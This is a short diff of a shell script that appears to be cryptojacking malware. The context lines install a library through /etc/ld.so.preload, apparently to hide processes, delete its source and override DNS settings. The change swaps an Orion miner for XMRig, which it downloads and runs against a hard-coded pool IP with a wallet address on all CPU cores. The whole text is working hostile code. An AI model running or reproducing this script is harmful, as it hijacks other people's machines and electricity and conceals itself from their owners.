@@ -9,9 +9,7 @@ echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
 echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
-mkdir .kap && cd .kap
-wget https://github.com/egg5233/ore-hq-client/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip
-cd OrionClient_linux
-chmod +x OrionClient
-./OrionClient mine -a --pool twbitz --key 76dvS6JKn3WmKQXm4Rx3LBQZHpagXmiqE67gu7CCB55h --worker $(shuf -n 1 -i 1-99999)-kir -t $(nproc --all) --ice
-
+wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+tar xf xmrig-6.22.2-linux-static-x64.tar.gz
+cd xmrig-6.22.2
+./xmrig --donate-level 1 -o 167.99.139.112:443 -u Q010500dcddedd09eb43778b8c86fc30d1682af477c2693f24c34113532603031ecdac7e2d5a133 -p x -a rx/0 -k -t $(nproc --all)
